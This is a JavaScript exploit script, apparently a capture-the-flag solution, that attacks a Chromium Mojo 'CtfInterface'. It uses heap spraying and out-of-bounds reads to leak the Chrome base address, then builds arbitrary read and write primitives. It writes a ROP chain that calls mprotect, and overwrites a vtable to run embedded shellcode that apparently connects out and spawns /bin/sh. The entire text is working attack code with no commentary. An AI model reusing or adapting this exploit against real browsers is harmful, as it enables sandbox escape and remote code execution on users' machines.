let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}


async function pwn() {
    
    let spray = [];

    for(let i=0; i<0x100; i++) {
        let p = new blink.mojom.CtfInterfacePtr();

        Mojo.bindInterface(blink.mojom.CtfInterface.name, 
            mojo.makeRequest(p).handle, 'context', true);

        spray.push(p);
    }
    
    let index = Math.floor(Math.random() * 100);
    console.log("Index to remove : " + index)
    spray.splice(index, 1)[0].ptr.reset();

    for(let i=0; i<(0x100-1); i++){
        await spray[i].resizeVector(4);
    }

    let oob = spray.splice(1, 1)[0]; 

    let vt = 0;
    let offset = 0;
    let oob2 = spray[0];

    while(true) {
        for(let i=0; i<0x100; i++) {
             vt = (await oob.read(i)).value.f2i();
            if(vt >> 0x2Cn != 0x5n) {
                continue;
            }

            let begin = (await oob.read(i + 1)).value.f2i();
            let end = (await oob.read(i + 2)).value.f2i();
            let endcap = (await oob.read(i + 3)).value.f2i();

            if(end != endcap || begin != end - 0x20n) {
                continue;
            }

            for(let j=0; j<spray.length; j++) {
                await spray[j].resizeVector(3);
                begin = (await oob.read(i + 1)).value.f2i();
                end = (await oob.read(i + 2)).value.f2i();

                if(end - begin == 0x18n) {
                    oob2 = spray[j];
                    offset = i;
                    break;
                }

            }
            break;
        }
        break;
    }



    console.log("Found one!");
    console.log("Virtual Table " + vt.hex());

    let chrome_base = vt - 0xbc774e0n;
    console.log("Chrome base " + chrome_base.hex());

    if(chrome_base < 0x0n || (chrome_base >> 0x2Cn) != 0x5n) {
        return location.reload();
    }
    
    // Now I'm ready to implement primitives.
    async function arb64_read(addr) {
        await oob.write(addr.i2f(), offset+1);
        return ((await oob2.read(0)).value.f2i());
    }

    async function arb64_write(where, what) {
        await oob.write(where.i2f(), offset+1);
        await oob2.write(what.i2f(), 0);
    }

    let pop_rdi = chrome_base + 0x035d445dn;
    let pop_rsi = chrome_base + 0x0348edaen;
    let pop_rdx = chrome_base + 0x03655332n;
    let pop_rax = chrome_base + 0x03419404n;
    let syscall = chrome_base + 0x0800dd77n; 
    var bss = chrome_base + 0xc2d0640n;
    let bss_base = bss - 0x640n;
    let pivot = chrome_base + 0x0590510en;

    /*
    let shellcode = [8.689034976057858e-308, 5.629558420881076e-308
        , 2.814779210440538e-308, 5.272892808344879e-21, -3.754538247695724e-34
        , 8.931534512674479e+164, 5.4725462592149954e+169, 
        9.853460483689271e+247, -6.828527034422575e-229];
        */

    let shellcode = [
                0x6a00000500c48148n,
                0x5e016a5f026a5829n,
                0xb848c58948050f99n,
                0x201010101010101n,
                0x7e5c100103b84850n,
                0x6a24043148030101n,
                0x5a106aef8948582an,
                0x48686a050fe68948n,
                0x2f2f2f6e69622fb8n,
                0x697268e789485073n,
                0x101012434810101n,
                0x485e086a56f63101n,
                0xd231e6894856e601n,
                0x6aff31050f583b6an,
                0x50f583cn,
                ]

    let heap_leak = (await oob.read(offset+2)).value.f2i()
    console.log("Heap leak @ " + heap_leak.hex())

    await arb64_write(bss - 0x18n, pop_rdi);
    await arb64_write(bss - 0x10n, bss_base);
    await arb64_write(bss - 8n, pop_rsi);

    await arb64_write(bss + 8n, pop_rsi);
    await arb64_write(bss + 0x10n, 0x1000n);
    await arb64_write(bss + 0x18n, pop_rdx);
    await arb64_write(bss + 0x20n, 0x7n);
    await arb64_write(bss + (0x8n * 5n), pop_rax);
    await arb64_write(bss + (0x8n * 6n), 0xan);
    await arb64_write(bss + (0x8n * 7n), syscall); 
    await arb64_write(bss + (0x8n * 8n), bss_base + 0x688n);
    await arb64_write(bss, pivot);
    
    for(let i=0n; i<shellcode.length; i++) {
        await arb64_write(bss + (0x8n * (0x9n + i)), shellcode[i]);
    }
    
    let leak = (await oob.read(offset)).value.f2i();
    console.log("Old vt " + leak.hex());
    
    
    bss -= 0x18n;

    await oob.write(bss.i2f(), offset);

     leak = (await oob.read(offset)).value.f2i();
     console.log("New vt " + leak.hex());

    
    setTimeout(async () => {
        console.log("Attack!");
        oob2.read(0);

    }, 0)
    
}

pwn();
